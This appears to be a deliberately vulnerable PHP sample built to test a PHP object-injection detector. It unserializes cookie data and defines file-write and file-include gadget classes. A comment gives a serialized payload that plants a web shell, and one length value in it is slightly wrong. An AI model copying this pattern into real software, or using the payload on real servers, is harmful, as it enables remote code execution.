<?php
/**
 * Vulnerable PHP Example — PHP Object Injection (POI)
 * 
 * PURPOSE: Demonstrates a classic POI vulnerability for research and
 * educational purposes as part of the php-poi-detector dissertation project.
 * 
 * VULNERABILITY: User-supplied input is passed directly to unserialize()
 * without validation, allowing an attacker to instantiate arbitrary objects
 * and trigger magic methods (__wakeup, __destruct) to achieve RCE.
 * 
 * DO NOT deploy this code in any production environment.
 */

// ── Gadget Class (POP Chain) ─────────────────────────────────────────────────

class FileLogger {
    public $logFile  = "/var/log/app.log";
    public $logData  = "";

    // Triggered automatically when object is destroyed
    public function __destruct() {
        // SINK: attacker controls $logFile and $logData via serialised payload
        file_put_contents($this->logFile, $this->logData);
    }
}

class ConfigLoader {
    public $configPath = "/etc/app/config.php";

    // Triggered automatically on unserialise
    public function __wakeup() {
        // SINK: attacker controls $configPath — arbitrary file inclusion
        include($this->configPath);
    }
}

// ── Vulnerable Entry Point ───────────────────────────────────────────────────

// SOURCE: user-controlled input from cookie — no sanitisation or validation
$userData = $_COOKIE['user_prefs'];

// VULNERABLE SINK: direct unserialise() of untrusted data
$obj = unserialize($userData);

// ── Example Attack Payload ───────────────────────────────────────────────────
/*
 * An attacker could craft a serialised FileLogger object like this:
 *
 * $payload = new FileLogger();
 * $payload->logFile = "/var/www/html/shell.php";
 * $payload->logData = "<?php system($_GET['cmd']); ?>";
 * echo serialize($payload);
 *
 * Output:
 * O:10:"FileLogger":2:{s:7:"logFile";s:24:"/var/www/html/shell.php";
 * s:7:"logData";s:30:"<?php system($_GET['cmd']); ?>";}
 *
 * When this is passed as the user_prefs cookie and unserialised,
 * __destruct() writes a PHP web shell to the server — achieving RCE.
 *
 * This detector aims to identify:
 * 1. The unserialise() sink on line 46
 * 2. The taint path from $_COOKIE (source) to unserialise() (sink)
 * 3. Available POP chain gadgets (FileLogger, ConfigLoader)
 */
?>
